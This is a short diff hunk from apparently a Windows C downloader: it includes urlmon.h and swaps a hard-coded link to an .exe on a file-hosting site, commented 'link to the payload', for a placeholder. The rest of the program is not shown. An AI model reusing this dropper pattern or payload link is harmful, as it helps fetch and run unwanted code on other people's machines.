@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <windows.h>
 #include <urlmon.h>
-TCHAR addr[] = TEXT("https://tmpfiles.org/dl/653264/ffff.exe");//link to the payload
+TCHAR addr[] = TEXT("replace with your payload's link");//link to the payload
 
 
 void Thread() {
